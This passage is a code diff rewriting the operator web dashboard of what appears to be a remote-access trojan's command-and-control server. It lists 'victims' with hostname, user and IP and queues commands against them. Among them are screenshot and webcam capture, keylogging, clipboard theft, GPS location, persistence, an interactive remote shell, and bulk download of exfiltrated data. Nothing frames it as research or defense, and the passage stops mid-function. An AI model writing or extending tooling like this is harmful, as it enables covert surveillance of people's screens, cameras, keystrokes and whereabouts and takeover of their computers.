-                </div>
-                <div class="panel">
-                    <h3>📷 WEBCAM</h3>
-                    <div class="panel-content" id="webcam-panel">
-                        <div class="empty-state"><div class="empty-state-icon">📷</div>No webcam captures yet</div>
-                    </div>
-                </div>
-                <div class="panel">
-                    <h3>⌨️ KEYSTROKES</h3>
-                    <div class="panel-content"><pre id="keystrokes-content">No keystrokes captured yet</pre></div>
-                </div>
-                <div class="panel">
-                    <h3>📍 GPS LOCATION</h3>
-                    <div class="panel-content" id="gps-panel">
-                        <div class="empty-state"><div class="empty-state-icon">📍</div>No location data yet</div>
-                    </div>
-                </div>
-                <div class="panel">
-                    <h3>📋 COMMAND OUTPUT</h3>
-                    <div class="panel-content"><pre id="output-content">whoami / system_info / process_list / clipboard results appear here</pre></div>
-                </div>
-                <div class="panel log-panel" style="grid-column: 1 / -1;">
-                    <h3>🖥️ INTERACTIVE SHELL</h3>
-                    <div class="shell-input-bar" style="display:flex;gap:8px;margin-bottom:12px;align-items:center;">
-                        <span style="font-family:'JetBrains Mono',monospace;color:var(--success);font-size:14px;">$</span>
-                        <input type="text" id="shell-input"
-                               placeholder="Type a command (e.g. whoami, ipconfig, dir &quot;C:\\&quot;)"
-                               autocomplete="off" spellcheck="false"
-                               style="flex:1;padding:10px 12px;background:var(--bg-tertiary);
-                                      border:1px solid var(--border);border-radius:8px;
-                                      color:var(--text-primary);font-family:'JetBrains Mono',monospace;
-                                      font-size:13px;outline:none;">
-                        <button onclick="sendShellCommand()"
-                                style="padding:10px 24px;background:var(--gradient-1);border:none;
-                                       border-radius:8px;color:#06080f;font-family:inherit;
-                                       font-weight:700;font-size:13px;cursor:pointer;">
-                            EXECUTE
-                        </button>
-                    </div>
-                    <div class="panel-content" style="max-height:260px;overflow-y:auto;">
-                        <pre id="shell-output" style="font-family:'JetBrains Mono',monospace;font-size:12px;
-                             color:var(--text-secondary);white-space:pre-wrap;padding:14px;
-                             margin:0;">No commands run yet.</pre>
-                    </div>
-                </div>
-                <div class="panel log-panel">
-                    <h3>📜 EVENT LOG</h3>
-                    <div class="panel-content" id="logs-panel">
-                        <div class="log-entry info">
-                            <span class="log-time">[--:--:--]</span><span>[SYSTEM] Command Center initialized</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+  </div>
+  <div class="search">
+    <span style="color:var(--muted)">⌕</span>
+    <input id="search-input" placeholder="Search victims…">
+  </div>
+  <div class="top-actions">
+    <button class="icon-btn" id="themeBtn" title="Toggle theme">🌙</button>
+    <a href="/logout" class="icon-btn" title="Logout" style="text-decoration:none">⏻</a>
+    <div class="avatar">OP</div>
+  </div>
+</header>
+
+<div class="shell">
+
+  <aside class="sidebar">
+    <div class="nav-label">Targets</div>
+    <select class="victim-select" id="victim-select">
+      <option value="">— Select victim —</option>
+    </select>
+    <div class="command-row">
+      <select id="cmd-select">
+        <option value="screenshot">📸 Screenshot</option>
+        <option value="webcam_snap">📷 Webcam</option>
+        <option value="keylog_start">⌨️ Keylog Start</option>
+        <option value="keylog_stop">⌨️ Keylog Stop</option>
+        <option value="clipboard_get">📋 Clipboard</option>
+        <option value="gps_locate">📍 GPS Locate</option>
+        <option value="process_list">⚙️ Process List</option>
+        <option value="system_info">💻 System Info</option>
+        <option value="whoami">👤 Whoami</option>
+        <option value="persist">🔒 Persist</option>
+      </select>
+      <button class="btn-primary" id="send-btn">SEND</button>
     </div>
-    <script>
-        const OPERATOR_TOKEN = "__OPERATOR_TOKEN__";
-        let selectedVictim = null;
-        let victims = {};
-        let lastVictimHash = '';
-        let lastKnownCounts = { screenshots: 0, webcam: 0, keystrokes: 0, locations: 0, outputs: 0 };
-        let lastTs = { screenshot: null, webcam: null, output: null, gps: null };
-        const DOM = {
-            clock: document.getElementById('clock'),
-            victimList: document.getElementById('victim-list'),
-            screenshotsPanel: document.getElementById('screenshots-panel'),
-            webcamPanel: document.getElementById('webcam-panel'),
-            keystrokesContent: document.getElementById('keystrokes-content'),
-            gpsPanel: document.getElementById('gps-panel'),
-            outputContent: document.getElementById('output-content'),
-            logsPanel: document.getElementById('logs-panel'),
-            downloadBtn: document.getElementById('download-btn'),
-            metricVictims: document.getElementById('metric-victims'),
-            metricExfil: document.getElementById('metric-exfil'),
-            metricScreenshots: document.getElementById('metric-screenshots'),
-            metricWebcam: document.getElementById('metric-webcam'),
-            metricKeystrokes: document.getElementById('metric-keystrokes'),
-        };
-        function updateClock() {
-            DOM.clock.textContent = new Date().toLocaleTimeString('en-US', { hour12: false });
+    <button class="btn-danger" id="destruct-btn">💀 SELF DESTRUCT</button>
+    <button class="btn-download" id="download-btn">⬇ DOWNLOAD ALL</button>
+
+    <div class="nav-label" style="margin-top:16px">Session</div>
+    <div class="nav-item active"><span class="dot"></span> Live Feed</div>
+    <div class="nav-item"><span class="dot"></span> Victims <span class="badge" id="victim-count-badge">0</span></div>
+    <div class="nav-item"><span class="dot"></span> Events</div>
+  </aside>
+
+  <main>
+    <div class="metrics">
+      <div class="metric" style="--accent:var(--violet)">
+        <div class="metric-top">
+          <div class="metric-icon">🎯</div>
+        </div>
+        <div class="metric-value" id="m-victims">0</div>
+        <div class="metric-label">Active Victims</div>
+      </div>
+      <div class="metric" style="--accent:var(--cyan)">
+        <div class="metric-top">
+          <div class="metric-icon">⚡</div>
+        </div>
+        <div class="metric-value" id="m-exfil">0</div>
+        <div class="metric-label">Exfil Events</div>
+      </div>
+      <div class="metric" style="--accent:var(--amber)">
+        <div class="metric-top">
+          <div class="metric-icon">📸</div>
+        </div>
+        <div class="metric-value" id="m-screenshots">0</div>
+        <div class="metric-label">Screenshots</div>
+      </div>
+      <div class="metric" style="--accent:var(--emerald)">
+        <div class="metric-top">
+          <div class="metric-icon">📷</div>
+        </div>
+        <div class="metric-value" id="m-webcam">0</div>
+        <div class="metric-label">Webcam Captures</div>
+      </div>
+      <div class="metric" style="--accent:var(--pink)">
+        <div class="metric-top">
+          <div class="metric-icon">⌨️</div>
+        </div>
+        <div class="metric-value" id="m-keystrokes">0</div>
+        <div class="metric-label">Keystroke Chunks</div>
+      </div>
+    </div>
+
+    <div class="grid">
+      <div class="panel">
+        <div class="panel-head">
+          <div class="panel-title">Exfil Activity <span>per victim</span></div>
+          <div class="chip">Live</div>
+        </div>
+        <div class="chart" id="chart"></div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-head"><div class="panel-title">Recent Events</div></div>
+        <div class="feed" id="feed"></div>
+      </div>
+
+      <div class="panel full">
+        <div class="panel-head">
+          <div class="panel-title">Victims <span id="victims-count-span">0 registered</span></div>
+          <div class="chip">Auto-refresh</div>
+        </div>
+        <table class="table">
+          <thead>
+            <tr><th>Hostname</th><th>User</th><th>IP</th><th>OS</th><th>Status</th><th>Last Seen</th><th>Exfil</th></tr>
+          </thead>
+          <tbody id="victims-tbody">
+            <tr><td colspan="7" style="text-align:center;color:var(--muted);padding:24px">Waiting for victims…</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="panel">
+        <div class="panel-head">
+          <div class="panel-title">Latest Screenshot</div>
+          <div class="chip" id="screenshot-ts">—</div>
+        </div>
+        <div class="panel-img-wrap" id="screenshot-panel">No screenshot yet</div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-head">
+          <div class="panel-title">Latest Webcam</div>
+          <div class="chip" id="webcam-ts">—</div>
+        </div>
+        <div class="panel-img-wrap" id="webcam-panel">No webcam capture yet</div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-head">
+          <div class="panel-title">GPS Location</div>
+          <div class="chip" id="gps-ts">—</div>
+        </div>
+        <div class="panel-img-wrap" id="gps-panel" style="min-height:200px">No GPS data yet</div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-head">
+          <div class="panel-title">Command Output</div>
+        </div>
+        <pre class="panel-pre" id="output-panel">whoami / system_info / process_list results appear here…</pre>
+      </div>
+
+      <div class="panel full">
+        <div class="panel-head">
+          <div class="panel-title">Interactive Shell</div>
+        </div>
+        <div class="shell-input-bar">
+          <span>$</span>
+          <input type="text" id="shell-input" placeholder="Type a command (e.g. whoami, ipconfig, dir &quot;C:\\&quot;)" autocomplete="off" spellcheck="false">
+          <button class="btn-primary" id="shell-exec-btn">EXECUTE</button>
+        </div>
+        <pre class="panel-pre" id="shell-output" style="min-height:140px">No commands run yet.</pre>
+      </div>
+
+      <div class="panel full">
+        <div class="panel-head">
+          <div class="panel-title">Console</div>
+          <div class="chip">tail -f</div>
+        </div>
+        <div class="console" id="console"></div>
+      </div>
+
+      <div class="panel full">
+        <div class="panel-head">
+          <div class="panel-title">Keystrokes</div>
+        </div>
+        <pre class="panel-pre" id="keystrokes-panel" style="min-height:120px">No keystrokes captured yet</pre>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+  const OPERATOR_TOKEN = "__OPERATOR_TOKEN__";
+  let selectedVictim = null;
+  let victims = {};
+  let lastTs = { screenshot: null, webcam: null, gps: null, output: null };
+  let lastKeystrokesCount = 0;
+
+  // ── Theme ────────────────────────────────
+  const root = document.documentElement;
+  const themeBtn = document.getElementById('themeBtn');
+  themeBtn.onclick = () => {
+    const dark = root.dataset.theme === 'dark';
+    root.dataset.theme = dark ? 'light' : 'dark';
+    themeBtn.textContent = dark ? '🌙' : '☀️';
+  };
+
+  // ── Console log ──────────────────────────
+  const consoleEl = document.getElementById('console');
+  function consoleLog(level, msg) {
+    const d = document.createElement('div');
+    const ts = new Date().toLocaleTimeString('en-US', { hour12: false });
+    const cls = (level === 'ok' || level === 'warn' || level === 'err' || level === 'info') ? level : 'info';
+    d.innerHTML = `<span class="time">${ts}</span> <span class="${cls}">${cls === 'ok' ? '✓' : cls === 'warn' ? '!' : cls === 'err' ? '✗' : '›'}</span> ${msg}`;
+    consoleEl.appendChild(d);
+    consoleEl.scrollTop = consoleEl.scrollHeight;
+    while (consoleEl.children.length > 200) consoleEl.removeChild(consoleEl.firstChild);
+  }
+
+  // ── Render victims table ────────────────
+  function renderVictims() {
+    const tbody = document.getElementById('victims-tbody');
+    const arr = Object.values(victims);
+    document.getElementById('victims-count-span').textContent = `${arr.length} registered`;
+    document.getElementById('victim-count-badge').textContent = arr.length;
+
+    if (arr.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--muted);padding:24px">Waiting for victims…</td></tr>';
+      return;
+    }
+    tbody.innerHTML = '';
+    arr.forEach(v => {
+      const tr = document.createElement('tr');
+      const ago = Math.round(Date.now() / 1000 - v.last_seen);
+      const agoStr = ago < 60 ? `${ago}s ago` : ago < 3600 ? `${Math.floor(ago/60)}m ago` : `${Math.floor(ago/3600)}h ago`;
+      const statusPill = v.status === 'online'
+        ? '<span class="pill ok">Online</span>'
+        : '<span class="pill err">Offline</span>';
+      tr.innerHTML = `
+        <td><b>${v.hostname}</b></td>
+        <td>${v.user}</td>
+        <td class="mono">${v.ip}</td>
+        <td class="mono">${v.os}</td>
+        <td>${statusPill}</td>
+        <td class="mono">${agoStr}</td>
+        <td class="mono">${v.exfil_count}</td>
+      `;
+      tr.onclick = () => {
+        selectedVictim = v.id;
+        document.getElementById('victim-select').value = v.id;
+        consoleLog('info', `Selected: ${v.hostname} (${v.id.slice(0,8)}…)`);
+        refreshExfil();
+      };
+      tbody.appendChild(tr);
+    });
+  }
+
+  // ── Chart ────────────────────────────────
+  function renderChart() {
+    const chart = document.getElementById('chart');
+    const arr = Object.values(victims);
+    chart.innerHTML = '';
+    if (arr.length === 0) {
+      chart.innerHTML = '<div style="width:100%;text-align:center;color:var(--muted);font-size:12px;padding:40px 0">No data yet</div>';
+      return;
+    }
+    const max = Math.max(1, ...arr.map(v => v.exfil_count));
+    arr.slice(0, 14).forEach(v => {
+      const bar = document.createElement('div');
+      bar.className = 'bar';
+      bar.style.height = Math.max(8, (v.exfil_count / max) * 100) + '%';
+      bar.title = `${v.hostname}: ${v.exfil_count} events`;
+      chart.appendChild(bar);
+    });
+  }
+
+  // ── Feed ─────────────────────────────────
+  async function refreshEvents() {
+    try {
+      const resp = await fetch('/events?t=' + Date.now());
+      if (!resp.ok) return;
+      const data = await resp.json();
+      const feed = document.getElementById('feed');
+      const evs = (data.events || []).slice(-8).reverse();
+      feed.innerHTML = '';
+      if (evs.length === 0) {
+        feed.innerHTML = '<div style="color:var(--muted);font-size:12px">No events yet</div>';
+        return;
+      }
+      evs.forEach(e => {
+        const d = document.createElement('div');
+        d.className = 'feed-item';
+        const color = e.level === 'ok' ? 'var(--emerald)'
+                    : e.level === 'warn' ? 'var(--amber)'
+                    : e.level === 'err' ? 'var(--rose)'
+                    : 'var(--cyan)';
+        const ago = Math.round(Date.now() / 1000 - e.ts);
+        const agoStr = ago < 60 ? `${ago}s ago` : `${Math.floor(ago/60)}m ago`;
+        d.innerHTML = `
+          <span class="feed-dot" style="color:${color};background:${color}"></span>
+          <div class="feed-body">
+            <div class="feed-text">${e.msg}</div>
+            <div class="feed-time">${agoStr}</div>
+          </div>`;
+        feed.appendChild(d);
+      });
+    } catch (e) { /* ignore */ }
+  }
+
+  // ── Refresh victims ──────────────────────
+  async function refreshVictims() {
+    try {
+      const resp = await fetch('/victims?t=' + Date.now());
+      if (resp.status === 401) {
+        consoleLog('err', 'Session expired — redirecting');
+        setTimeout(() => window.location.href = '/login', 800);
+        return;
+      }
+      const data = await resp.json();
+      victims = {};
+      data.victims.forEach(v => { victims[v.id] = v; });
+
+      document.getElementById('m-victims').textContent = data.count;
+      document.getElementById('m-exfil').textContent =
+        data.victims.reduce((s, v) => s + v.exfil_count, 0);
+      document.getElementById('m-screenshots').textContent =
+        data.victims.reduce((s, v) => s + v.screenshots_count, 0);
+      document.getElementById('m-webcam').textContent =
+        data.victims.reduce((s, v) => s + v.webcam_count, 0);
+      document.getElementById('m-keystrokes').textContent =
+        data.victims.reduce((s, v) => s + v.keystrokes_count, 0);
+
+      // Update victim selector
+      const sel = document.getElementById('victim-select');
+      const cur = sel.value;
+      sel.innerHTML = '<option value="">— Select victim —</option>';
+      data.victims.forEach(v => {
+        const opt = document.createElement('option');
+        opt.value = v.id;
+        opt.textContent = `${v.hostname} (${v.status})`;
+        sel.appendChild(opt);
+      });
+      if (cur && victims[cur]) sel.value = cur;
+      if (!selectedVictim && data.victims.length > 0) {
+        selectedVictim = data.victims[0].id;
+        sel.value = selectedVictim;
+      }
+
+      // Auto-deselect if gone
+      if (selectedVictim && !victims[selectedVictim]) {
+        consoleLog('warn', `Victim ${selectedVictim.slice(0,8)}… disappeared`);
+        selectedVictim = null;
+        resetExfilPanels();
+      }
+
+      renderVictims();
+      renderChart();
+      if (selectedVictim) refreshExfil();
+    } catch (e) { /* ignore */ }
+  }
+
+  // ── Exfil data refresh ───────────────────
+  function resetExfilPanels() {
+    lastTs = { screenshot: null, webcam: null, gps: null, output: null };
+    document.getElementById('screenshot-panel').innerHTML = 'No screenshot yet';
+    document.getElementById('webcam-panel').innerHTML = 'No webcam capture yet';
+    document.getElementById('gps-panel').innerHTML = 'No GPS data yet';
+    document.getElementById('output-panel').textContent = 'whoami / system_info / process_list results appear here…';
+    document.getElementById('keystrokes-panel').textContent = 'No keystrokes captured yet';
+    document.getElementById('screenshot-ts').textContent = '—';
+    document.getElementById('webcam-ts').textContent = '—';
+    document.getElementById('gps-ts').textContent = '—';
+  }
+
+  async function refreshExfil() {
+    if (!selectedVictim) return;
+    try {
+      const resp = await fetch(`/exfil-data/${selectedVictim}?t=` + Date.now());
+      if (resp.status === 404) {
+        selectedVictim = null;
+        resetExfilPanels();
+        return;
+      }
+      if (!resp.ok) return;
+      const data = await resp.json();
+
+      // Screenshot
+      const ss = data.screenshots || [];
+      if (ss.length) {
+        const last = ss[ss.length - 1];
+        if (last.ts !== lastTs.screenshot) {
+          lastTs.screenshot = last.ts;
+          const url = `/latest_screenshot/${selectedVictim}?t=${encodeURIComponent(last.ts)}`;
+          const el = document.getElementById('screenshot-panel');
+          el.innerHTML = '';
+          const img = document.createElement('img');
+          img.className = 'panel-img';
+          img.src = url;
+          img.onerror = () => { el.innerHTML = 'Screenshot not an image'; };
+          el.appendChild(img);
+          document.getElementById('screenshot-ts').textContent = new Date(last.ts).toLocaleTimeString();
+          consoleLog('ok', `Screenshot received from ${selectedVictim.slice(0,8)}…`);
         }
-        setInterval(updateClock, 1000); updateClock();
-        function log(msg, type = 'info') {
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
-            const t = document.createElement('span');
-            t.className = 'log-time';
-            t.textContent = `[${time}]`;
-            const m = document.createElement('span');
-            m.textContent = msg;
-            entry.appendChild(t); entry.appendChild(m);
-            DOM.logsPanel.insertBefore(entry, DOM.logsPanel.firstChild);
-            while (DOM.logsPanel.children.length > 50) DOM.logsPanel.removeChild(DOM.logsPanel.lastChild);
+      }
+
+      // Webcam
+      const wc = data.webcam || [];
+      if (wc.length) {
+        const last = wc[wc.length - 1];
+        if (last.ts !== lastTs.webcam) {
+          lastTs.webcam = last.ts;
+          const url = `/latest_webcam/${selectedVictim}?t=${encodeURIComponent(last.ts)}`;
+          const el = document.getElementById('webcam-panel');
+          el.innerHTML = '';
+          const img = document.createElement('img');
+          img.className = 'panel-img';
+          img.src = url;
+          img.onerror = () => { el.innerHTML = 'No camera on victim'; };
+          el.appendChild(img);
+          document.getElementById('webcam-ts').textContent = new Date(last.ts).toLocaleTimeString();
+          consoleLog('ok', `Webcam capture received`);
         }
-        function resetPanels() {
-            lastTs = { screenshot: null, webcam: null, output: null, gps: null, shell: null };
-            lastKnownCounts = { screenshots: 0, webcam: 0, keystrokes: 0, locations: 0, outputs: 0 };
-            DOM.screenshotsPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📸</div>No screenshots yet</div>';
-            DOM.webcamPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📷</div>No webcam captures yet</div>';
-            DOM.keystrokesContent.textContent = 'No keystrokes captured yet';
-            DOM.gpsPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📍</div>No location data yet</div>';
-            DOM.outputContent.textContent = 'whoami / system_info / process_list / clipboard results appear here';
+      }
+
+      // Keystrokes
+      const kl = data.keystrokes || [];
+      if (kl.length !== lastKeystrokesCount) {
+        lastKeystrokesCount = kl.length;
+        let txt = '';
+        kl.forEach(k => { txt += k.data; });
+        document.getElementById('keystrokes-panel').textContent = txt || 'No keystrokes captured yet';
+      }
+
+      // GPS
+      const locs = data.locations || [];
+      if (locs.length) {
+        const last = locs[locs.length - 1];
+        if (last.ts !== lastTs.gps) {
+          lastTs.gps = last.ts;
+          renderGPS(last.data);
+          document.getElementById('gps-ts').textContent = new Date(last.ts).toLocaleTimeString();
+          consoleLog('ok', `GPS received`);
+        }
+      }
+
+      // Outputs
+      const outs = data.outputs || [];
+      if (outs.length) {
+        const last = outs[outs.length - 1];
+        if (last.ts !== lastTs.output) {
+          lastTs.output = last.ts;
+          const body = typeof last.data === 'object'
+            ? JSON.stringify(last.data, null, 2)
+            : String(last.data);
+          if (last.type === 'shell') {
             const so = document.getElementById('shell-output');
-            if (so) so.textContent = 'No commands run yet.';
-            DOM.metricScreenshots.textContent = '0';
-            DOM.metricWebcam.textContent = '0';
-            DOM.metricKeystrokes.textContent = '0';
-            DOM.metricExfil.textContent = '0';
+            if (so.textContent === 'No commands run yet.') so.textContent = '';
+            so.textContent += body.endsWith('\n') ? body : body + '\n';
+            so.scrollTop = so.scrollHeight;
+          } else {
+            document.getElementById('output-panel').textContent =
+              `[${last.ts}] ${last.type.toUpperCase()}\n${'='.repeat(50)}\n${body}`;
+          }
+          consoleLog('ok', `Output: ${last.type}`);
         }
-        function setPanelPending(panelId, label) {
-            const el = document.getElementById(panelId);
-            el.innerHTML = `<div class="empty-state">
-                <div class="empty-state-icon" style="animation:spin 1s linear infinite;">⏳</div>
-                ${label}
-            </div>`;
-        }
-        function updateVictimList() {
-            DOM.downloadBtn.disabled = !selectedVictim;
-            DOM.victimList.innerHTML = '';
-            const arr = Object.values(victims);
-            if (arr.length === 0) {
-                DOM.victimList.innerHTML = `<div style="color:var(--text-muted);font-size:12px;padding:12px;text-align:center;">
-                    <div style="font-size:24px;opacity:0.3;margin-bottom:8px;">🔍</div>Waiting for victims...</div>`;
-                return;
-            }
-            arr.forEach(v => {
-                const card = document.createElement('div');
-                card.className = `victim-card ${v.id === selectedVictim ? 'active' : ''}`;
-                const statusClass = v.status === 'online' ? 'status-online' : 'status-offline';
-                const statusIcon = v.status === 'online' ? '🟢' : '🔴';
-                card.innerHTML = `
-                    <h4>💻 ${v.hostname}</h4>
-                    <p>🆔 ${v.id}</p>
-                    <p>🖥️ ${v.os} | 👤 ${v.user}</p>
-                    <p>🌐 ${v.ip}</p>
-                    <p class="${statusClass}">${statusIcon} ${v.status}</p>`;
-                card.onclick = () => {
-                    selectedVictim = v.id;
-                    resetPanels();
-                    updateVictimList();
-                    log(`Selected victim: ${v.hostname} (${v.id})`, 'info');
-                    refreshExfilData();
-                };
-                DOM.victimList.appendChild(card);
-            });
-        }
-        async function downloadAllData() {
-            if (!selectedVictim) return;
-            const btn = DOM.downloadBtn;
-            const originalText = btn.innerHTML;
-            btn.disabled = true;
-            btn.innerHTML = 'PREPARING ZIP...';
-            try {
-                const resp = await fetch(`/download-all/${selectedVictim}?t=${Date.now()}`, {
-                    headers: { 'X-Operator-Token': OPERATOR_TOKEN }
-                });
-                if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
-                const blob = await resp.blob();
-                const url = URL.createObjectURL(blob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = `CyberRecon_${selectedVictim}.zip`;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                URL.revokeObjectURL(url);
-                log(`Downloaded all data for ${selectedVictim}`, 'success');
-            } catch (e) {
-                log(`Download failed: ${e.message}`, 'error');
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = originalText;
-            }
-        }
-        async function refreshVictims() {
-            try {
-                const resp = await fetch('/victims?t=' + Date.now());
-                if (resp.status === 401) {
-                    log('Session expired — redirecting to login', 'error');
-                    setTimeout(() => window.location.href = '/login', 800);
-                    return;
-                }
-                const data = await resp.json();
-                const newHash = JSON.stringify(data.victims.map(v => v.id + v.status).sort());
-                DOM.metricVictims.textContent = data.count;
-                if (newHash !== lastVictimHash) {
-                    lastVictimHash = newHash;
-                    victims = {};
-                    data.victims.forEach(v => { victims[v.id] = v; });
-                    if (selectedVictim && !victims[selectedVictim]) {
-                        log(`Victim ${selectedVictim} disappeared — deselecting`, 'error');
-                        selectedVictim = null;
-                        resetPanels();
-                    }
-                    updateVictimList();
-                }
-                if (!selectedVictim && data.count > 0) {
-                    selectedVictim = data.victims[0].id;
-                    resetPanels();
-                    updateVictimList();
-                    log(`Auto-selected victim: ${data.victims[0].hostname} (${selectedVictim})`, 'info');
-                }
-            } catch (e) { console.error(e); }
-        }
-        async function refreshExfilData() {
-            if (!selectedVictim) return;
-            try {
-                const resp = await fetch(`/exfil-data/${selectedVictim}?t=` + Date.now());
-                if (resp.status === 401) {
-                    log('Session expired — redirecting to login', 'error');
-                    setTimeout(() => window.location.href = '/login', 800);
-                    return;
-                }
-                if (resp.status === 404) {
-                    log(`Victim ${selectedVictim} no longer on server — deselecting`, 'error');
-                    selectedVictim = null;
-                    resetPanels();
-                    updateVictimList();
-                    return;
-                }
-                if (!resp.ok) return;
-                const data = await resp.json();
-                const ss = data.screenshots || [];
-                if (ss.length) {
-                    const last = ss[ss.length - 1];
-                    if (last.ts !== lastTs.screenshot) {
-                        lastTs.screenshot = last.ts;
-                        const url = `/latest_screenshot/${selectedVictim}?t=${encodeURIComponent(last.ts)}`;
-                        let img = DOM.screenshotsPanel.querySelector('img');
-                        if (img) img.src = url;
-                        else {
-                            DOM.screenshotsPanel.innerHTML = '';
-                            img = document.createElement('img');
-                            img.src = url;
-                            img.onerror = () => {
-                                DOM.screenshotsPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">⚠️</div>Screenshot not an image</div>';
-                            };
-                            DOM.screenshotsPanel.appendChild(img);
-                        }
-                        log(`Screenshot received`, 'success');
-                    }
-                }
-                DOM.metricScreenshots.textContent = ss.length;
-                const wc = data.webcam || [];
-                if (wc.length) {
-                    const last = wc[wc.length - 1];
-                    if (last.ts !== lastTs.webcam) {
-                        lastTs.webcam = last.ts;
-                        const url = `/latest_webcam/${selectedVictim}?t=${encodeURIComponent(last.ts)}`;
-                        let img = DOM.webcamPanel.querySelector('img');
-                        if (img) img.src = url;
-                        else {
-                            DOM.webcamPanel.innerHTML = '';
-                            img = document.createElement('img');
-                            img.src = url;
-                            img.onerror = () => {
-                                DOM.webcamPanel.innerHTML = '<div class="empty-state"><div class="empty-state-icon">⚠️</div>No camera available on victim</div>';
-                            };
-                            DOM.webcamPanel.appendChild(img);
-                        }
-                        log(`Webcam capture received`, 'success');
-                    }
-                }
-                DOM.metricWebcam.textContent = wc.length;
-                const kl = data.keystrokes || [];
-                if (kl.length) {
-                    if (kl.length !== lastKnownCounts.keystrokes) {
-                        let text = '';
-                        kl.forEach(k => { text += k.data; });
-                        if (DOM.keystrokesContent.textContent !== text) {
-                            DOM.keystrokesContent.textContent = text;
-                        }
-                        lastKnownCounts.keystrokes = kl.length;
-                    }
-                }
-                DOM.metricKeystrokes.textContent = kl.length;
-                const locs = data.locations || [];
-                if (locs.length) {
-                    const last = locs[locs.length - 1];
-                    if (last.ts !== lastTs.gps) {
-                        lastTs.gps = last.ts;
-                        renderGPS(last.data);
-                        log(`GPS location received`, 'success');
-                    }
-                }
-                const outs = data.outputs || [];
-                if (outs.length) {
-                    const last = outs[outs.length - 1];
-                    if (last.ts !== lastTs.output) {
-                        lastTs.output = last.ts;
-                        const body = typeof last.data === 'object'
-                            ? JSON.stringify(last.data, null, 2)
-                            : String(last.data);
-                        if (last.type === 'shell') {
-                            const so = document.getElementById('shell-output');
-                            if (so) {
-                                if (so.textContent === 'No commands run yet.') so.textContent = '';
-                                so.textContent += body.endsWith('\n') ? body : body + '\n';
-                                so.scrollTop = so.scrollHeight;
-                            }
-                        } else {
-                            let text = `[${last.ts}] ${last.type.toUpperCase()}\n${'='.repeat(50)}\n${body}`;
-                            DOM.outputContent.textContent = text;
-                        }
-                        log(`Output: ${last.type}`, 'success');
-                    }
-                }
-                DOM.metricExfil.textContent = ss.length + wc.length + kl.length + locs.length + outs.length;
-            } catch (e) { console.error(e); }
-        }
-        function renderGPS(loc) {
-            if (typeof loc === 'string') { try { loc = JSON.parse(loc); } catch(e) { return; } }
-            const lat = parseFloat(loc.latitude);
-            const lon = parseFloat(loc.longitude);
-            if (loc.error || isNaN(lat) || isNaN(lon) || (lat === 0 && lon === 0)) {
-                DOM.gpsPanel.innerHTML = `<div class="empty-state"><div class="empty-state-icon">⚠️</div>${loc.error || 'Location unavailable'}</div>`;
-                return;
-            }
-            const accuracy = loc.accuracy_m ? `±${Math.round(loc.accuracy_m)}m` : 'Unknown';
-            const source = loc.source || 'Unknown';
-            const d = 0.01;
-            const bbox = `${(lon - d).toFixed(6)},${(lat - d).toFixed(6)},${(lon + d).toFixed(6)},${(lat + d).toFixed(6)}`;
-            const mapUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lon}`;
-            DOM.gpsPanel.innerHTML = `
-                <div class="gps-info">
-                    <div class="gps-coords">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
-                    <div class="gps-meta">📍 ${source} • Accuracy: ${accuracy}</div>
-                    <iframe src="${mapUrl}" style="width:100%;height:200px;border-radius:8px;border:1px solid var(--border);display:block;" loading="lazy"></iframe>
-                </div>`;
-        }
-        async function sendCommand() {
-            if (!selectedVictim) return;
-            const cmd = selectedCmd;
-            try {
-                const resp = await fetch(`/command/${selectedVictim}`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Operator-Token': OPERATOR_TOKEN
-                    },
-                    body: JSON.stringify({command: cmd})
-                });
-                if (resp.status === 401) {
-                    log('Session expired — redirecting to login', 'error');
-                    setTimeout(() => window.location.href = '/login', 800);
-                    return;
-                }
-                if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
-                await resp.json();
-                log(`Command queued: ${cmd}`, 'success');
-                if (cmd === 'screenshot') setPanelPending('screenshots-panel', 'Capturing screen...');
-                if (cmd === 'webcam_snap') setPanelPending('webcam-panel', 'Capturing webcam...');
-                if (cmd === 'gps_locate')  setPanelPending('gps-panel', 'Locating...');
-                if (cmd === 'clipboard_get') DOM.outputContent.textContent = 'Fetching clipboard...';
-                enterFastPoll();
-            } catch (e) {
-                log(`Failed to send command: ${e.message}`, 'error');
-            }
-        }
-        async function sendShellCommand() {
-            if (!selectedVictim) {
-                log('Select a victim first', 'error');
-                return;
-            }
-            const input = document.getElementById('shell-input');
-            const out = document.getElementById('shell-output');
-            const raw = input.value.trim();
-            if (!raw) return;
-            if (out.textContent === 'No commands run yet.') out.textContent = '';
-            out.textContent += `$ ${raw}\n`;
-            out.scrollTop = out.scrollHeight;
-            try {
-                const resp = await fetch(`/shell/${selectedVictim}`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Operator-Token': OPERATOR_TOKEN
-                    },
-                    body: JSON.stringify({ command: raw })
-                });
-                if (resp.status === 401) {
-                    log('Session expired — redirecting to login', 'error');
-                    setTimeout(() => window.location.href = '/login', 800);
-                    return;
-                }
-                const data = await resp.json();
-                if (!resp.ok) throw new Error(data.error || `HTTP ${resp.status}`);
-                log(`Shell queued: ${raw}`, 'success');
-                input.value = '';
-                enterFastPoll();
-            } catch (e) {
-                out.textContent += `[ERROR] ${e.message}\n`;
